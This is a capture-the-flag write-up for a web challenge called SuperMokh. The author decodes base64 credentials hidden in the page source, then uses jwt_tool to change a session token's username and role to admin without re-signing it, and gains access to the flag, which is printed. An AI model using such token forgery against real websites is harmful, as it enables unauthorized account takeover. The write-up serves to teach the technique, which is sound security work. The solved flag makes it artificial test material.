# SuperMokh

> Category: Web Exploitation🕸️

![img](desc.png)


## 🔍 Overview

Visiting the page shows us the login form.

![img](page.png)

Try to view the page source reveals some hints:

![img](source.png)

## ✨ Solution

Decode the base64:
```
┌──(elitemi24㉿IffatAcer3)-[~]
└─$ echo "Z3Vlc3Q6U2VsYW5nb3IxOTcyXzE5ODc=" | base64 -d
guest:Selangor1972_1987
```

Use the credentials to login to the page. In the page, we are not able to view the flag due to our current role is guest:

![img](login.png)

Try to view the cookies of the page:

![img](cookies.png)

It is a <code>JWT</code>, try to decode it first:
```
┌──(elitemi24㉿IffatAcer3)-[~]
└─$ jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InZpc2l0b3IiLCJpYXQiOjE3NTY3MjQxMTksImV4cCI6MTc1NjcyNzcxOX0.QExhyMIhUDPVbcJYwkjduGn5MKFycbBrQskuD1c415g

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/home/elitemi24/.jwt_tool/jwtconf.ini
Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] username = "guest"
[+] role = "visitor"
[+] iat = 1756724119    ==> TIMESTAMP = 2025-09-01 18:55:19 (UTC)
[+] exp = 1756727719    ==> TIMESTAMP = 2025-09-01 19:55:19 (UTC)

Seen timestamps:
[*] iat was seen
[*] exp is later than iat by: 0 days, 1 hours, 0 mins

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

We can see that the current username is guest and our role is only visitor. In the page, there's actually a hint that only <code>SuperMokh</code> can access the flag. So, we need to try change the username to <code>SuperMokh</code> and the role to <code>admin</code>:
```
┌──(elitemi24㉿IffatAcer3)-[/mnt/d/CTF]
└─$ jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InZpc2l0b3IiLCJpYXQiOjE3NTY3MjQxMTksImV4cCI6MTc1NjcyNzcxOX0.QExhyMIhUDPVbcJYwkjduGn5MKFycbBrQskuD1c415g -T

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/home/elitemi24/.jwt_tool/jwtconf.ini
Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] typ = "JWT"
[2] alg = "HS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "guest"
[2] role = "visitor"
[3] iat = 1756724119    ==> TIMESTAMP = 2025-09-01 18:55:19 (UTC)
[4] exp = 1756727719    ==> TIMESTAMP = 2025-09-01 19:55:19 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of username is: guest
Please enter new value and hit ENTER
> SuperMokh
[1] username = "SuperMokh"
[2] role = "visitor"
[3] iat = 1756724119    ==> TIMESTAMP = 2025-09-01 18:55:19 (UTC)
[4] exp = 1756727719    ==> TIMESTAMP = 2025-09-01 19:55:19 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 2

Current value of role is: visitor
Please enter new value and hit ENTER
> admin
[1] username = "SuperMokh"
[2] role = "admin"
[3] iat = 1756724119    ==> TIMESTAMP = 2025-09-01 18:55:19 (UTC)
[4] exp = 1756727719    ==> TIMESTAMP = 2025-09-01 19:55:19 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_a809fb08b1fea9795621f8e15494424b - Tampered token:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IlN1cGVyTW9raCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1NjcyNDExOSwiZXhwIjoxNzU2NzI3NzE5fQ.QExhyMIhUDPVbcJYwkjduGn5MKFycbBrQskuD1c415g
```

Now, change the current JWT to the new JWT, then reload the page:

![img](supermokh.png)

Try to view the flag:

![flag](flag.png)

<details><summary><b>🏳️ Flag:</b></summary><b>3108{m0kht4r_d4h4r1_l3g3nd_n3v3r_d13s}</b></details>